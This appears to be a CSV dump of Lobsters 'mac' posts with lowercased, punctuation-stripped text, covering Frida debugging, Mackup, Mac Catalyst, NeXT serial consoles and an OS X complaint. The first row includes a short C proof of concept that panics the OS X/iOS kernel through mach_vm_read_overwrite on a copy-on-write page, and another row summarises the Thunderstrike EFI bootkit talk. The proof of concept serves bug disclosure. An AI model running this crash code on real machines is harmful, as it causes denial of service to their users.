678,Lobsters,mac,Apple macOS,DIY: kernel panic OS X and iOS in 10 LOC,https://medium.com/@oleavr/diy-kernel-panic-os-x-and-ios-in-10-loc-c250d9649159,diy kernel panic o x io loc,diy kernel panic o x io loc wwwfridare frida update incorporated improvement http,diy kernel panic o x io locafter receiving quite report user wwwfridare kernel panic upon attaching second time process finally got around debugging kernel figure going onfirst little background frida hook function call rewriting function prologue memory order make containing memory page writable patch code later revert shared library mapped copied memory kernel share memory page process memory page copyonwrite local modification simply give process copy memory page question whenever frida intercept function shared library sideeffect occurs upon attaching process frida hook one function user frida may hooking plenty well also every time frida attache process probe portion address space also mean parsing metadata loaded shared library parsing end reading memory pageshaving increasingly frustrated looming kernel panic never finding big enough chunk time investigate properly opportunity finally presented fired bincat guinea pig program one terminal attached frida detached next bincat still running ran vmmap copied output debugger machine next requested frida attach second time kernel panic triggered usual machine waiting debugger attach fired lldb attached quick look callstack revealed hitting failing assertion handling machvmreadoverwrite looking argument clear requested read many byte looking back vmmap output noticed something peculiar asked read first page shared library unlike library page library second page marked prv private cow copyonwrite made perfect sense knew frida hooked one function particular library could bug handling read spanning cow prv page quickly wrote tiny c program test theory yep issue simplifying arrived include unistdh include machmachh include machodyldh ifndef define machvmprotect vmprotect define machvmreadoverwrite vmreadoverwrite endifextern kernreturnt machvmprotect vmmapt machvmaddresst machvmsizet booleant vmprott extern kernreturnt machvmreadoverwrite vmmapt machvmaddresst machvmsizet machvmaddresst machvmsizet intmain int argc char argv volatile char library const machvmsizet pagesize getpagesize const machvmsizet buffersize pagesize char buffer buffersize machvmsizet resultsize library char dyldgetimageheader machvmprotect machtaskself machvmaddresst library pagesize pagesize false vmprotread vmprotwrite vmprotcopy library pagesize cow prv transition library pagesize undo dummymodification resultsize panic machvmreadoverwrite machtaskself machvmaddresst library buffersize machvmaddresst buffer resultsize return compile run observe instant kernel panic latest o x io update incorporated improvement http frida git workaround limit read one page time part upcoming release released soonnote reported apple february though impression past event likely fix anytime soon
679,Lobsters,mac,Apple macOS,Sync App Settings in Dropbox with Mackup,http://blog.wadegarrett.com/2015/02/17/sync-app-settings-in-dropbox-with-mackup/,sync app setting dropbox mackup,mackup sayz lim organizes file mackup online backup safe dropsync mackup mackup mackup mackup google drive copy mackup documentation getting started mackup homebrew mackup mackup mackupcfg filesystem dropbox mackupcfg storage configuration mackup mackup mackup documentation mackup bettertouchtool mackup backup mb mackup sparkle application sync application ignore mackupcfg mackup,using mackup since use primary filesystem online backup thanks article sayz lim organizes file us mackup online backup able use setup template help create setup one thing adopted safe directory use backup device application setting nexus use dropsync backup app also full backup phone backup app specific file mac exentsions chromebook creating symlinks file yesterday setup mackup mackup communitydriven tool used backup restore system application setting mackup make easy backup sync setting cloud mackup google drive copy read mackup documentation information see list supported application getting started mackup o x easily install mackup using homebrew brew install mackup mackup us dropbox default work year back installed new ssd removed optical drive favor original hdd came macbook pro dropbox directory located setup mackup use dropbox directory need create mackup config file mackupcfg vi mackupcfg order work use filesystem storage engine rather dropbox mackupcfg look like storage configuration storage engine filesystem path volumeshdd directory mbp chose manually set apps wanted mackup sync ignore created handful custom configs apps supported mackup information creating custom app configs view mackup documentation also made custom config app mackup support bettertouchtool running mackup backup first time bettertouchtool directory using mb mackup bettertouchtool config simply excludes directory mackup config sparkle application sync applicationstosync adium bartender bash bettertouchtool bundler caffeine dotfiles hazel heroku insurgency mackup moom pow smcfancontrol ssh textual transmission transmit usboverdrive xtrafinder application ignore applicationstoignore adobelightroom xcode got mackup configured time run command sync setting mackup backup command create symlink application designated mackupcfg file sync setting mackup
681,Lobsters,mac,Apple macOS,"MPW, Carbon and building Classic Mac OS apps in OS X",http://blog.steventroughtonsmith.com/post/109040361205/mpw-carbon-and-building-classic-mac-os-apps-in-os,mpw carbon building classic mac o apps o x,humble broadcast development journal kept twitter prototype future update around third drag drop developer pledge support available app store available iphone ipad unleashed upon world applescript support catalyst development thread live app store find github indeed possible catalyst apps submit feedback catalyst previously documented many reason available uikit macos loading appkit bundle using appkit technically possible however list thing appreciate appkit auxiliary panel sheet proxy icon color picker cursor dock menu bar status item nsworkspace nstask system applescript earlier post service apple legacy tutorial swiftui like microsoft radar building analogy macstories tentpole feature xcode io playground pythonista io rumor terminal environment io went built darwin mosh openterm ish systemlevel drawingmarkup view apple pencil opengles custom view controller nonui extension provider extension audio unit extension key upkey event using private api mouse support api capture mouse cursor quake larger ipads external touch screen support io drafting table threecolumn view surface book turn expanded usb device support io mfi eyetv tuner game capture ftdi cable readwrite external drive file app formatpartition external volume readwrite disk image scripting shifted dramatically hundred shortcut workflow virtual machine hypervisorframework let developer build virtual machine mini vmac entitlement entitlement apply apple reminiscing twitter openstep relatively simple announced older,u list project like someday star align one thing back mind something color missing part io always bugged comprehensive support color system level one favorite bit ui since early day mac o x system color panel originally nextstep beautifully comprehensive wheel slider palette crayon swatch amazing eyedropper tool supported throughout cocoa apps mac mac apps make use color well control somewhere ui drag drop color apps even onto rich text system editor color fundamental type object desktop macos love io never gained standard color picker ui platform used artist everywhere amazing creative apps firstparty stylus accessory apple yet everybody reinvent color wheel uikit apps come mac via catalyst even jarring uikit way invoke system color picker one thing io support drag drop color never know iwork suite let drop color onto shape object fill mail safari let drop color onto rich text style thirdparty apps free implement color drag drop year although select like mindnode concept humble broadcast development kicked high gear started prototyping app manage collect color interapp drag drop support called pastel might following along development journal kept twitter like project day started mac catalyst app spent much early development brought ipad later iphone really love direction workflow opposite direction catalyst developer would go force care complexity mac first distilling something fit tiny screen allows faster development cycle building io simulator device really three scenario want color palette library app whilst developing apps web page whilst designing new piece artwork usually pixel artwork game prototyping keeping paint diary painting miniature built pastel entirely around first two scenario prototype future update around third think reflected throughout ui copy variety io developer representation instance tiny bitmap version palette context menu intentionally avoided building kind feature professional artist designer might want expect lovingly recreated whole bunch macos nscolorpanel io including favorite tab crayon picker nt much work sound pretty fun experience especially little thing like determining exactly color slider work update realtime drag drop key making pastel part advanced workflow ipad supporting drag drop pick color palette drop inside another app crazy cool see developer pledge support apps raised awareness potential capability color drag drop part io open anybody would great see place love pastel fun halo app kind scenario love even spur apple providing systemwide color picker morecomprehensive color support future version io make even interesting next update pastel likely available time read mode let use pastel splitscreen color picker window drag supporting apps available app store sounded interesting pastel available iphone ipad free try library cap item inapppurchase like want unlock larger library mac version pastel something pick sometime wwdc intention launching later summer universal purchase wo nt pay anything extra launch blast working pastel really hope like feel free send picture pretty palette library create please consider supporting color drag drop apps way back built mini streaming radio player app use home give family included local irish radio station simplistic vanilla ui true minimum viable product worked barely enough satisfy wanted put mobileradio shelf time forgotten pile abandoned project never really thought going back announcement catalyst uikit macos wwdc figured would fun build catalyst app ground mac initial intention bringing iphone ipad trawled project folder came across mobileradio figured would perfect example put lot love building radio app mac using uikit delved deep talking appkit necessary try build experience worthy macos using apple new podcasts app template replicated ui using latest apis technology io relying heavily context menu point intention shipping radio app macos otherwise inspired developer debuting catalyst apps launch macos catalina excitement figured could make showcase product sort named hcc radio high caffeine content included preset irish radio station unleashed upon world figured pretty good example catalyst respectful mac user experience thus far hcc radio done well limited niche irish radio streaming apps one interesting question last year around applescript support catalyst marzipan apps possible sure idea app would make app review took upon build applescripting hcc radio illustrate macos uh deep cut app built io apis hcc radio fun side project something really motivating actually shipping software compelled try bringing app io unlike catalyst project hcc radio built first mac next obvious choice bring ipad conceptually similar many way ipad would able reuse existing structure app iphone would require rethink navigation wanted build kind ipad app people like want much blownup iphone app really happy turned going bring io expand app new feature needed better product name broadcast born broadcast unlike hcc radio full support adding station collection syncs icloud run io ipados mac retains applescript support whereas io support mouse trackpad pulldown command menu discoverable keyboard shortcut like hcc radio broadcast free app preset irish radio station want unlock editing feature asks simple inapp purchase subscription monthly fee required app universal purchase buy iphone ipad get mac version free vice versa first time ever shipped app inapp purchase pretty curious see land following development thread twitter pleased know broadcast live app store iphone ipad mac free go try hope like ipad ui much check mouse trackpad support let know kind feature like see next interesting rumor wwdc shortcut might coming mac course raise kind question future automation macos wwdc came went shortcut got huuge upgrade io like new conversational editor thirdparty action input output shortcut come mac turn catalyst macos catalina includes shortcut framework including one necessary bring almost entire ui built dummy app find github test harness nt really useful anything except explore idea shortcut mac would fit system would want product make fun demo shortcut consumer product brand unto think many u building library shortcut io would love way bring mac many io apps coming mac via catalyst likely never adopt applescript even though indeed possible catalyst apps could benefit let hope shortcut team find time busy takingovertheworld schedule bring shortcut macos submit feedback make sure know important wwdc new way write apps mac catalyst catalyst developerfacing name technology formerly known marzipan bringing ipad apps mac introducing uikit dozen framework io platform unifying substrate layer io macos catalyst apps built io sdk relatively change api set simply click mac checkbox project xcode get started previously documented far one could go mojave version uikit jumped enough hoop mean integrate applescript service many reason benefit catalystbased mac app deeply integrate system feature catalyst sdk hand go integrating mac appkit build best possible mac app uikit let take available uikit macos catalyst apps granted access nstoolbar part appkit sdk apps create rich window toolbars nstouchbar integrate touch bar wanted spawn appkit window appkit view hierachy augment app try use appkit class catalyst app rapidly run apiunavailablebegin io appkit class marked unavailable uikit app first glance seems pretty clear cut io sdk nt let touch appkit app however new unified process model macos catalina mean uikit app also appkit app could use loading appkit bundle since apple making point treat catalyst apps true mac apps mean app mac app embed appkitbased bundle framework load runtime plugin simply add new macos bundle target project embed new macos bundle app make inclusion conditional macos simple loadable bundle built mac sdk thus access appkit load manually detect running macos nsstring pluginpath nsbundle mainbundle builtinpluginspath stringbyappendingpathcomponent appkitgluebundle nsbundle bundlewithpath pluginpath load create principal class bundle remember add infoplist treat like entrypoint appkit land instantiate uikit code good go using appkit unified process model macos catalina uikit app nsapplication sharedinstance might expect appkit list app window like would nswindow appkit app give bridge modify app window way otherwise catalyst make impossible like changing window style mask setting position frame onscreen setting minimummaximum window size free spawn new window like load appkit nib storyboards whatever suit best everything running app free call selector uikit appkit might best use intermediary class pas message two since wo nt able import uikit appkit code one thing ca nt mix uikit appkit layer view hierarchy may technically possible kind thing would expect break moment another thing quite spawn new nswindow uikit view hierarchy however uikit code ability spawn new window scene appkit code ability take resulting nswindow presented hijack whatever want sense could spawn uikit window auxiliary palette kind feature clearly intended use catalyst push boundary make best software like expect fellow mac developer else using appkit uikit app enable let go martin pilkington fantastic list thing appreciate appkit see catalyst app improve auxiliary panel sheet spawn nspanel instance floating palette control app like tool palette also present complex appkit window sheet uikit window want little adventurous listen new window spawn use hijack uikitspawned window purpose perhaps make nonactivating floating panel present window sheet proxy icon set representedurl representedfilename primary window add proxy icon currently open document add icon window titlebar represent document point user drag drop proxy icon another app somewhere finder also commandclick proxy icon show document full path color picker bridge use nscolorpanel uikit app get rich native color picker use drive uikit ui color picker also load thirdparty color picker plugins many great example exist macos cursor change mouse cursor nscursor might expect system cursor custom image many mac apps change cursor based tool content interacting way catalyst app also give way showhide mouse cursor game capture wish dock update dock icon app runtime custom generated icon like progress bar long export operation add badge string also customize dock menu option runtime menu bar status item implement nsstatusitem appkit bundle provide menu bar icon like may used apps like dropbox status item dropdown menu many apps spawn borderless window simulate miniapp ui invoked status item theoretically might able present uikit app window status item little iphonesized region quite appropriate used full mac ipad app nsworkspace use nsworkspace move item trash reveal file finder load icon file disk among many thing nstask system nstask allows run shell command commandline apps pipe thing process appkit bundle uikit app support interaction applescript applescript service easier ever use follow previous instruction applescript section earlier post add apple event support app one tiny thing changed since mojave implementation longer need private aeinstallrunloopdispatcher call setupappleevents apple event already set might expect appkit good go decide best relay apple event uikit code action appropriate app service service let vend action system various type content like file image text etc service menu show context menu app offer service currently selected type content service show menu simply follow apple legacy tutorial implement service appkit bundle everything work see bridge appkit like make world difference maclike app feel user many way hybrid uikitappkit app give best world compatibility existing io codebase well able much possible give mac user thing expect good mac app apple starting use little bit catalyst mac apps like fullscreen imessage effect macos catalina sure accelerate future even something exciting new swiftui card apple lot thing built uikit thirdparty developer mac deserves able use uikit way need want build thing mac future bright catalyst apps dieter bohn make case apple go allin marzipan want apple force like okay ipad version mail version mail mac user inside apple get use nt like fix think many apps stomach nt everyone gon na use regular mac apps mean ask microsoft keeping window classic version office around trying change apps window window went nt go well vocal think uikit coming mac something excited much potential unifying software ecosystem across apple platform right ca nt stay fence like microsoft work need need make good hard imagine wanting use write kind software io make feel mac make io user feel really hope apple finally deciding marzipan decade io apple dominant platform mean apple longer fence mac v io divide made tough decision chart course future mac desktop apple provides next week wwdc bring uikit apps mac nt good enough need let know fix year step two multiyear transition inevitably leave u running universal iosmac apps arm mac plenty time fix thing nt standard expect mac apps mac platform prepare radar must allhandsondeck moment apple really nt think viable future mac marzipan fall flat face apple dominant ecosystem io ship sailed new ui framework declarative layer top going change arithmetic new app framework mac definition shared across io mac right back started time got point may native desktop apps left io still accelerating future new formfactors augmented reality whatever come next even native app development titan like adobe version photoshop development webassembly hard see appeal developer web amazing webgl webassembly enable kind powerful new platform however truly believe apple provides best native development framework world platform many highest quality consumer apps world steve job would explain next later cocoa framework presentation used building analogy love much developer write apps platform build upon foundation laid beneath next framework powerful like starting twentieth floor building building upwards developer ever going build three floor worth great app starting twentieth floor end twentythreefloor building os reinvent wheel every time new apps start lower floor fifth floor classic mac o started steve analogy three storey app would nt even reach high starting point next app next competitive advantage became apple competitive advantage later iphone competitive advantage competitive advantage native platform apple web would shame halfass transition marzipan concede defeat web apps desktop instead letting native apps reach height deserve still dividing apple attention one two native app framework ten floor tall always major constraint want see apple really transition painful apple yes think worth piece first appeared macstories may way back era io laid tentpole feature wanted see come io mac three year later many thing wishlist become reality probably good time revisit topic nt yet come pas plan new wishlist year come originally planned list developeruser split became clear two go handinhand complex thing io today using various automation apps step away needing thing developer xcode io much changed since development ipad much still stay apple introduced playground year provided swift ide ipad playground fantastic still build install app using mix match c objectivec code swift project structure code take place one file fine teaching material anybody wanting create something complex apple changed app store rule finally enable programming apps live io without fear removed albeit unfortunate restriction like able display output app screen however still way thirdparty programming app run code outofprocess user mistake crash app completely course way build install app locally using one ides pythonista io still incredible need something bridge gap programming environment io let design write build sign install application without resort using mac third party build apple app store rule platform restriction prevent anybody else able thus apple one build xcode io make powerful developer might need whilst also building mechanism o make safe secure possible many fundamental pillar necessary build xcode like nt exist io like useraccessible file system drag drop multiple window floating panel shortly rumor believed terminal environment io much like file system certain class user need commandline environment kind nt gone away sure apple hoped apple shortcut app user ever automating task io make perfect sense provide something power user need especially xcode io becomes reality went built sandboxed terminal app described post populated core bsd utility apple darwin demonstration seen mosh openterm much ish go far emulating linux environment try provide working shell io apps sandboxed using public apis apple capable building real thing nt install emulator ipad able curl url untar run ffmpeg convert local video file sandboxed terminal nt need let mess system apps provide way execute unsigned code kill process able live jail let whatever want inside much way gui user get whatever want shortcut maintaining safety security o systemlevel drawingmarkup view four year postapple pencil still apple provides developer apis drawing sketching markup every app reinvent wheel want pencilbased drawing may suit couple developer invested lot time effort drawing engine excludes every developer happens good idea way integrate sketching app apple provided sample code past sadly openglesbased want anything appropriate left scour github building drawing engine look good feel responsive promotion incredibly difficult yet apple great drawing framework o use note app would perfect provide developer several apps sitting shelf would benefit greatly builtin api drawing view hope apple get around sooner rather later custom view controller nonui extension provider extension powered many new apis io macos completely obviating plugin model robust outofprocess signed sandboxed mechanism however developer define extension point thus use empower apps programming environment io able run code extension separate process securely scoped task supposed crash wo nt bring host app course exactly apple playground app work nt something third party allowed access similarly able define uibased extension point apps implement extension would show inside app ever used audio unit extension point exactly let presenting custom uis various instrument audio processing apps installed region inside app ui audio app using coreaudio many way developer could innovate providing extension point fact much custom url ecosystem io sprang standardized way apps talk use function apple shortcut app workflow born custom url ecosystem apple realized potential great acquired workflow built o extension point could exposed action shortcut app let call transparently part workflow without ui instead dosado apps custom url involve today key upkey event seems crazy still unable track raw keyboard event io way barring using private api app allow hold physical key input like wasd key game modifier key like holding shift resizing something app like photoshop maintain aspect ratio developer know key pressed released shortcut invoked restriction seems pointless today incredibly restrictive affecting everything professional creative apps game ipad need robust hardware keyboard support chained restriction formulated decade ago different world mouse support api much way time robust mouse trackpad support io uikit coming mac framework add bunch interaction like right click hover scroll bar bring ipad user benefit choose workflow demand controlling ui absolute coordinate important function mouse forget mousecapturing relative movement essential game remote desktop emulator uikit thus need let capture mouse cursor need click thing onscreen combine robust keyboard support would able play game like firstperson shooter ipad like mac pc quake anyone android supported mouse nearly decade done anything lessen touch experience need worry io user workflow truly want need mouse ipad always nonstarter support one time barrier go away larger ipads external touch screen support time however computer want desk io drafting table ipad essentially blank canvas truer frontfacing button bigger canvas begets entirely new experience dying see io scale desktopsized workflow several apps onscreen desktop io device applequality large external touch screen would love ipad used mac laptop since ipad completely obviated formfactor grows ever powerful imagine ever going back people like apple need offer even bigger model ipad ipad pro already get custom uis expansive layout threecolumn view uikit mac behoove developer create apps layout scale screen anyway deeply envious surface book course turn something along line running io would suit need incredibly well expanded usb device support io mfi might gone usbc ipad pro developer need public apis write user mode driver anything wish plug ipad want able plug various eyetv tuner eyetv app happily init like mac want game capture work io record footage gaming pc actually able edit render fastest computer house ipad pro want plug raspberry ftdi cable view serial output ipad without buying crazy mfibased serial adapter whatever workflow might need burn cd dvd able plug disc drive using app designed task work way ipads simply today readwrite external drive file app wishlist need say long overdue imagine apple holding much longer like go formatpartition external volume readwrite disk image want read drive need able manage erase partition volume understand multiple file system image file apply disk image pervasive disk image support genuinely one crowning achievement result ton disk image two decade macos use disk image every day create cd floppy image pas file tofrom vmware qemu user file system access becomes core part using ipad need rest choose never use mac apple telling old data lost scripting applescript io one item list apple automation landscape shifted dramatically since apple acquired workflow shortcut perception applescript may long world slowly pushed favor sandboxed secure modern extension mechanism employed shortcut scripting still incredibly important evidenced hundred shortcut workflow used anybody take io seriously work day applescript really want see textual interface shortcut let thing without navigate fiddle ui filled action class advanced user prefers writing script thing need script need way run silently without presenting ui onscreen jumping apps scripting extended ui layer letting developer build richly scriptable apps like today mac applescript easy envision shortcut scripting using javascript swift shortcut already scripting action let run javascript webpage virtual machine hard see apple supporting virtualization io virtual machine require thing like justintime compilation execute arbitrary code memory violates one core foundation io security model burn battery life like task however apple provides webkit io also requires special security exception execute code memory macos provides hypervisorframework lightweight virtualization system let developer build virtual machine easily kind user would love see hypervisor io let company like vmware parallel bring expertise ipad offer approved way run armbased linux window couple year macos perhaps emulation may question perhaps wo nt always case sure developer library vms everything do nextstep older version macos iphone sdks course use vms io today opensource apps like bochs mini vmac sideloaded onto device nt ability jit run entirely using cpu emulation significantly slower burn battery entitlement finally brings entitlement entitlement system io allows apple finegrained control developer access feature wish use icloud app app must signed icloud entitlement similar requirement health home apple pay many part io carplay example need special entitlement nt given freely developer fact apply apple get app idea approved even let test feature app app developer ever found abusing privilege entitlement revoked apple app remotely disabled thus entitlement great way apple entrust developer partner special access feature developer never use misuse mind apple could entrust eg google microsoft mozilla entitlement need use real browser engine io instead webkit real chrome real firefox vmware parallel could entrusted build virtual machine emulator without leaving open attack vector malicious thirdparty apps disk utility could permitted partition disk ides could permitted run background process install apps attach debugger running apps many thing given freely developer would arguably make io much le safe place read powerful desktop computer entitlement mechanism place apple could still keep control want let get hand seeing past intercompany politics io going need method thing eventually especially io app ecosystem supplant mac app ecosystem due course mac without ability build install apps attach debugger would unimaginably crippled come long way fear enabling thirdparty apps iphone bring cell network trying actively build future io today like hand tied behind back io long relied fact mac exists fallback perform task apple nt ready rethink modern platform nt mean problem nt relevant worth solving left u situation io move forward new idea mac stand still needing keep compatibility io ecosystem whilst tiptoeing line keeping thing losing freedom power old system active development enthusiasm new correct path forward simply revert mechanism available desktop baggage come rethink thing fit modern secure world io exponentially better working file app drag drop automation background task splitscreen multitasking ipad stylus hardware keyboard ipad well completely hide complexity user nt need know mechanic system beyond tapping app open swiping home indicator close thing added io nt made o harder use transparent sure user nt even know exist user need become essential tentpoles io experience uikit desktop time revisit io app ca nt longer io apps apps nowwith rapidlyupcoming introduction uikit apps mac reminiscing twitter quite bit apple transition mac o x nextstep mac o found common ground despite two different os architecturally design standpoint couple different vector follow permit converge place one artifact final day next prerelease version nextstep despite appearing openstep operating system succeeded nextstep nextstep build abbreviate herein vastly different ui set apps new colored window chrome background image tabbed shelf bottom screen quite departure grayscale nextstep knew however builtin apps piqued interest redesigned rebuilt variant many apps shipped nextstep none change later made openstep fact nt resurface year later apple acquires next revamps openstep mac look feel project named rhapsody later became mac o x server fun track progression apps period let take look version mail follow way o x mail prerelease nextstep next recently sun finalized openstep confused openstep o crossplatform refactor sweeping revamp old nextstep framework seemed acrosstheboard revamp system apps take advantage openstep apps thanks openstep portability would run solaris window well next o however next actually shipped next version o renamed openstep nextstep nt include instead openstep older ironically preopenstep set apps despite shipping year beta tell immediately looking mail step backward mail openstep seems obvious hindsight fancy upgrade next working put shelf realized company future without acquisition perhaps build intended woo potential buyer like apple sure enough rhapsody includes revamped apps getgo mail rhapsody rhapsody apple first attempt merging world macintosh next architecturally much nextstep first build rhapsody released developer august seven month acquisition closed design goal developer beta relatively simple port openstep powerpc adopt mac hig design language iconography provide finder desktop see progression left openstep rhapsody developer release right mac o x serverrhapsody next ui nt maclike machine designed unix workstation professional academic market almost feel ui design language openstep mac o mouse keyboard os nt mean transitioning straightforward multitasking different menuing different famously next o never desktop menu bar across top screen even something simple like scrollbars control take granted today left nextstep apple teach next appkit maclike meant required lot work many year mac o x server maclikeness mac o x server still controlled preference key appkit fact switch completely revert system back looking like openstep wild experience mac o x server looked acted much like mac o pro look feel mac retained power unix next framework even built upon next feature like menu could tear float onscreen however mac o x server fatal flaw become apparent apple year since next acquisition mac o x server nt run legacy mac apps mac developer board rewriting everything completely objectivec appkit mac o x actually work successor mac o apple customer going gut start solution apple going port legacy mac o toolbox new compatibility library called carbon make linchpin consumer mac o x experience even apple knew wanted consumer rhapsody something special however became clear apple needed rethink strategy completely mac o x became completely different thing mac o x server preceded tentpole change would replace kernel driver model replace display postscript rendering pdfbased quartz deeply integrate carbon make legacy mac apps firstclass citizen adopt brand new ui called aqua lot next pure foundation framework rearchitected atop common foundation carbon classic mac o appearance manager became basis aqua ui appkit menu widgetcontrol rendering replaced mac o foundation course meant carbon apps cocoa appkit apps would look despite vastly different architecture apple needed show developer carbon going real valid way forward temporary stopgap committed using carbon mac o x finder carbon version finder introduced mac o x developer preview aqua revealed acted bit like next single root window file viewer toolbar column view secondary window stage apple nt quite know systemwide toolbars inherited nextstep mac o x developer preview first time saw aqua build came transformational change mac o x ui year three apple transition next technology apple path finding maclike rather trying match classic mac o apple better understanding wanted navigation finder element ui still comically oversized finder evidence transition carbon side revisit mail see appkitcocoa faring o release mail mail saw earlier piece look different indeed still betrays next root iconography preference window clearly look similar carbonbased finder see environment starting come together something new shared design language mac o x shipped consumer refined massively first implementation aqua mail mac o x appkit finder mac o x carbon taken apple four year find new maclike template mac o x followed ever since eighteen year later element mac o x ui still recognizable today much think mac experience today came nextstep mac o appkit toolbars service tooltips multicolumn table view font color picker idea dock application bundle installer package home folder multiple user might even hardpressed find carbon app application folder today apple announced wo nt even run next version macos apple got chance complete doover mac o x modern architecture optimized touchscreen device powerful gpus thermal resource battery constraint doover course iphone o instead appkit come way nextstep refactored rebuilt openstep powered first decade mac o x apple apple decided build something fresh everything learned uikit technology progressed uikit device power become complex powerful macos uikit finally coming back mac serve toptier native application development framework alongside appkit start apple next transition like last time almost unfathomably difficult see two completely different architecture cooperate find common ground like last time start baby step uikit adopting metric style macos appkit adopting interaction io two side growing closer time sharing dna like last time road ahead much longer see perspective building towards come next even nt yet know really interesting question probably wo nt answer year come whether uikit carbon cocoa transition think appropriate answer yes uikit present developer ecosystem bring incredibly important appkit also present provides power mac know sure great genredefining apps uikit appkit mac carbon itunes photoshop microsoft office final cut pro eighteen year carbon finally reaching end date transition apps cocoaappkit complete appkit still eighteen year left ahead think mac fine classic mac o nextstep came end mac think everybody agree unified whole much greater sum part clear future still written mac developer io developer alike get help shape need cowbell older
683,Lobsters,mac,Apple macOS,MongoDB.app,https://github.com/gcollazo/mongodbapp,mongodbapp,mongodbapp easiest way get started mongodb mac version number adding mongo binary path installing homebrew cask homebrew cask similar project,mongodbapp easiest way get started mongodb mac download drag application folder doubleclick version number version number project mongodbapp try communicate included version included mongodb binary bundled release version number also includes build number used indicate current version mongodbapp independent bundled mongodb version adding mongo binary path need add mongodb binary path adding following bashprofile add mongodbapp binary path export path applicationsmongodbappcontentsresourcesvendormongodbbin path using pathhelper alternative sudo mkdir p etcpathsd echo applicationsmongodbappcontentsresourcesvendormongodbbin sudo tee etcpathsdmongodbapp installing homebrew cask also install mongodbapp homebrew cask brew cask install gcollazomongodb similar project
685,Lobsters,mac,Apple macOS,NeXT 68040 NextStation Serial Console,http://www.asterontech.com/Asterontech/NeXT_68040_Serial_Console.html,next nextstation serial console,available,next nextstation serial console n mac o introduction serial console allow user access machine without use native keyboard display device useful want run machine headless also used multiuser setup next machine compatible serial pinout adapt cube use serial protocol instruction assume machine able adapt little effort also note machine different pinouts b serial port using macbook mac o client machine required hardware usb adapter using adapter next minidin pin din cable null modem cable construction detail ohm resistor step cabling null modem configuration next us minidin connector following pinout female view dtr dcd txd gnd rxd rts nc ct standard pin connector following pinout female view dcd rxd txd dtr gnd dsr rts ct ri basic principal want next terminal emulator talk want null modem cable configuration mean sender reciever sendrecieve siginals opossite position rx tx tx rx etc connect cable follows next dtr dcd dcd dtr txd rxd gnd gnd rxd txd rts ct connected ct rts step running headless optional nextstation output serial data rom monitor system detect keyboard display mean need use resistor trick start unit without soundboard attached ohm poweron pin gnd pin custom dongle pushbutton resistor gnd convenience also need enable console access rom monitor enter rom monitor cmd system test type p set serial port alternate console yes step enable console access nextstep need modify etcttys file allow console access want enable getty serial port change entry exactly one ttya ttyfa ttydfa entry caveat applies b port note enabling getty sure nt port use printing check printmanager program application outgoing access via tip uucp permissible see z man page detail want start window server default uncomment first entry comment second console usretcgetty next secure bnextstepwindowserver onoption usretcgetty secure windowusrli uncomment ttya usretcgetty secure ttya usretcgetty unknown secure step cross finger test able connect cable serial port usb adapter mac need find name serial adapter o x type l ltr devcu shell last entry likely usb serial adapter briansmacbookpro brian l ltr devcu crwrwrw root wheel jan devcubluetoothmodem crwrwrw root wheel jan devcubluetoothincomingport crwrwrw root wheel jan use screen connect serial port using following command ixon ixon start next enabled console output running headless start see boot sequence otherwise little sytem start eventually see login prompt next mach localhost ttya localhost login addendum wiring cube connection specific usb adapter case usb adapter available gearmo next pinout dtr ct txd gnd rxd txd dcdrtxc port b rxd next dsub dtr nc ct nc txd rxd gnd gnd rxd txd txd rxd dcdrtxc prt b nc rxd txd
686,Lobsters,mac,Apple macOS,Why I quit OS X,http://wozniak.ca/why-i-quit-os-x,quit o x,quit o x turn pain as,quit o x nearly year using o x primary o personal work switched away late consider best tech decision made last year started using o x tiger released ditched linux time needed print thing linux awful o x productive o x serious complaint snow leopard came content pang dislike started show lion ioslike gui launchpad resonate thing progressed became increasingly annoyed environment time upgraded yosemite macbook pro longer felt like personal computer upgrade spent fighting newest bell whistle order keep environment comfortable familiar spent lot time going system preference figuring turn order get sanity back furthermore found stopped using majority primary apps ship o x mail safari itunes apple creativity appsilife part ran essentially three apps firefox mailmate work done terminal culture operating system point sharing personal productivity short working grain environment gradual transition o x went useful tool set get work done obnoxious ecosystem longer wanted part damning lack personal connection though complete lack transparency general decline software quality perceived basically got useful information prior system upgrade description like say nothing link provided much illuminating furthermore idea size download set reasonable expectation time going spend waiting upgrade egregious fact upgrade could take multiple hour due incredibly slow directory merge simply put work amateur knowing ahead time saved lot frustration kind thing ship least get hope saying minute better part hour message complete shitshow stunning regression gave shortly yosemite installed content frequently outoforder mislabeled new conversation usually unparsable lot little thing irk md hog distnoted hog lack virtualization system service mysteriously firing bogging system help macbook pro one lemon overheats easily thus kicking fan taking mode point default position apple software o x moved seem interested pumping quantity way upgrade death thousand cut death nonetheless reflecting came realization frustrated disappointed o x see getting better simply enjoying quit quit met different frustration feel like hopeless frustration gone back desktop system running linux consider markedly inferior o x term usability feel like personal computer enjoying experience look forward working even monumental pain as maybe needed change scenery know longer felt welcome o x world ultimately leave
687,Lobsters,mac,Apple macOS,Thunderstrike: EFI bootkits for Apple MacBooks,http://media.ccc.de/browse/congress/2014/31c3_-_6128_-_en_-_saal_1_-_201412291830_-_thunderstrike_efi_bootkits_for_apple_macbooks_-_trammell_hudson.html#video,thunderstrike efi bootkits apple macbooks,trammell hudson video starting audio related event download related tag,trammell hudson playlist video starting audio related event presentation demonstrate thunderstrike vulnerability allows installation persistent firmware modification efi boot rom apple popular macbooks bootkit easily installed evilmaid via externally accessible thunderbolt port survive reinstallation osx well hard drive replacement installed prevent software attempt remove could spread virally across airgaps infecting additional thunderbolt device download related tag
688,Lobsters,mac,Apple macOS,The Death of Cocoa,http://nshipster.com/the-death-of-cocoa/,death cocoa,thing go south rfc documentation number toplevel function operator literal binary octal hexadecimal addition decimal string written previously swift literal convertible default protocol implementation article uri url urn something along line rfc rfc data structure rawoptionsettype nate cook nice complete implementation date time french republican calendar idea interchange format pubsub property list regular expression wrapper error us error pointer appkit uikit thinking mother demo apology douglas engelbart functionality offered standard library production budget movie max speed mcdonnell douglas hornet shape france converting mile kilometer clustering value knowing size earth unicode common locale data repository cldr libphonenumber healthkit already swift standard library collision course cocoa new language continues gain momentum one expect see fracturing reinvention within system framework,cocoa de facto standard library objectivec containing many essential framework working language foundation appkit core data cocoa touch basically cocoa uikit substituted appkit often used interchangeably cocoa refer system framework io many u simplicity elegance performance apple hardware software working together reason build platform indeed shortage word penned site adulation cocoa design functionality yet month working swift cocoa begun lose luster saw swift beginning end objectivec cocoa first time apple standard library would made obsolete remember carbon swift designed modern language feature allow safer performant code however one could forgiven seeing swift little distraction compiler tool team swift advantage trickle conventional application usage objectivec swift code interoperate meaningful way launch arguably allowing adventurous engineer within team lowrisk way introduce swift existing code base crucial wide adoption new language already seen 